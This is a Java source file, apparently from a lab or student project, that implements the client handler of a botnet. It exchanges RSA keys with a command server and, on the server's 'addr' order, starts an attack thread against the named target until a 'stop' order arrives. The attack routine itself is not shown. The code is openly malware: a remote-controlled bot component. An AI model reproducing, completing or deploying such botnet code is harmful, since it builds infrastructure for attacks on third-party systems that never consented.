package com.edsolab.BotNet.Client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PublicKey;
import java.sql.SQLException;

import com.edsolab.BotNet.TLV.Data;
import com.edsolab.BotNet.TLV.Msg;

import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;

public class ClientHandler extends ChannelInboundHandlerAdapter {

	private Msg msg;

	@Override
	public void channelActive(ChannelHandlerContext ctx) throws Exception {
		msg = new Msg();
		// Thuật toán phát sinh khóa - RSA
		KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
		kpg.initialize(2048);
		// Khởi tạo cặp khóa
		KeyPair kp = kpg.genKeyPair();
		// PublicKey
		PublicKey publicKeyC = kp.getPublic();
		// PrivateKey
		KeyClient.privateKeyC = kp.getPrivate();
		msg.setType("pubK");
		msg.setKey(publicKeyC.getEncoded());
		ctx.writeAndFlush(msg);
	}

	@Override
	public void channelRead(ChannelHandlerContext ctx, Object msgResponse) throws Exception {
		Data responseData = (Data) msgResponse;
		procesData(responseData);
	}

	private void procesData(Data responseData) {
		if (responseData.getTag().equalsIgnoreCase("addr")) {
			KeyClient.stop = false;
			AttackProcessor processor = new AttackProcessor(responseData);
			new Thread(processor).start();
		}
		if (responseData.getTag().equalsIgnoreCase("stop")) {
			KeyClient.stop = true;
			System.out.println("Stop attack!!!!");
		}
		if (responseData.getTag().equalsIgnoreCase("cntd")) {
			System.out.println("Connected..........");
		}
	}

	@Override
	public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws SQLException {
		System.out.println("Disconnected.....");
		ctx.close();
	}

}